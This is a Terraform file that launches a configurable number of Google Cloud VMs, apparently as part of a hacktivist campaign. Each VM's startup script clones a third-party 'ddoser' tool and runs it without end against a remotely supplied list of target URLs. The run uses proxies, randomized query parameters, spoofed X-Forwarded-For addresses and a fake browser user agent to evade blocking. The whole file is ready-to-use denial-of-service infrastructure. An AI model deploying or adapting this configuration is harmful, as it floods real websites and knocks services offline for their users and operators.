resource "random_shuffle" "region" {
  input        = ["us-west1", "europe-west3"]
  result_count = 1
}

resource "random_shuffle" "zone" {
  input        = ["a","b","c"]
  result_count = 1
}

output "zone" {
    value = "${join(",", random_shuffle.region.result)}-${join(",", random_shuffle.zone.result)}"
}

provider "google" {
    region      = join(",", random_shuffle.region.result)
    zone      = "${join(",", random_shuffle.region.result)}-${join(",", random_shuffle.zone.result)}"
}

resource "google_compute_instance" "default" {
  count        = var.sonofukraine_count
  name         = "sonofukraine-${count.index}"
  machine_type = var.machine_type

  boot_disk {
    initialize_params {
      image = var.os_type
    }
  }

  network_interface {
    network = "default"
    access_config {
        nat_ip = ""
        network_tier = "PREMIUM"
    }
  }

  metadata = {
    foo = "bar"
  }

  metadata_startup_script = <<EOF
apt update && apt install -y ca-certificates curl gnupg lsb-release git python3 python3-pip
git clone https://github.com/taransergey/ddoser.git
cd ddoser/
pip3 install -r requirements.txt
echo "python3 ./ddoser.py --target-urls-file ${var.targets_file_url} --concurrency ${var.ddoser_concurency} --timeout 20 --with-random-get-param --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\" --count 0 --log-to-stdout --proxy-url \"${var.proxy_file_url}\" --restart-period 600 --random-xff-ip" > command.sh
python3 ./ddoser.py --target-urls-file ${var.targets_file_url} --concurrency ${var.ddoser_concurency} --timeout 20 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url "${var.proxy_file_url}" --restart-period 600 --random-xff-ip 2>&1 > /var/log/ddoser.log
EOF

}
